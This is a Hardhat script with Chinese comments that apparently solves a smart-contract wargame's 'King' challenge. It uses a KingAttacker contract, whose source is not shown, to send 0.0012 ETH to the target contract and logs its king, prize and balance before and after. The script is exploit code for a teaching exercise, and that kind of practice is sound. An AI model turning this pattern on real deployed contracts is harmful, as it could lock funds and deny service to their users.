import hre from "hardhat";
const { ethers } = hre;

// 替換成 King 的合約實例地址
const KING_ADDRESS = "0xB74A565AD5498aC2b571fdC822D2C863c97fA88D";
console.log("KING_ADDRESS: ", KING_ADDRESS);

const KINGATTACKER_ADDRESS = "0x25a3078774069607CDD4377F8eC1F1F5B53b4E3e";
console.log("KINGATTACKER_ADDRESS: ", KINGATTACKER_ADDRESS);

async function deployKingAttacker() {
    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.deploy(KING_ADDRESS);
    await kingAttacker.waitForDeployment();
    console.log("KingAttacker deployed to: ", await kingAttacker.getAddress());
}

async function main() {
    // 只執行一次
    // await deployKingAttacker();
    
    const king = await ethers.getContractAt("King", KING_ADDRESS);
    const kingAttacker = await ethers.getContractAt("KingAttacker", KINGATTACKER_ADDRESS);
    console.log("目前 KING 的 owner 狀態: ", await king.owner());
    console.log("目前 KING 是誰: ", await king._king());
    console.log("目前 KING 的 prize 狀態: ", await ethers.formatEther(await king.prize(), "ETH"));
    // 應該是 0.001
    console.log("目前 KING 的餘額狀態: ", await ethers.formatEther(await hre.ethers.provider.getBalance(KING_ADDRESS)), "ETH");

    // 發送代幣到 King
    const value = ethers.parseEther("0.0012");
    console.log("Sending transaction to toKing()...");
    const tx = await kingAttacker.toKing({
         value: value
        });
    // 等待交易確認
    console.log("交易發送中，交易哈希:", tx.hash);
    const receipt = await tx.wait();
    console.log("交易確認，區塊號:", receipt.blockNumber);

    console.log("目前 KING 的 owner 狀態: ", await king.owner());
    console.log("目前 KING 是誰: ", await king._king());
    console.log("目前 KING 的 prize 狀態: ", await king.prize());
    console.log("目前 KING 的餘額狀態: ", await ethers.formatEther(await hre.ethers.provider.getBalance(KING_ADDRESS)), "ETH");


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });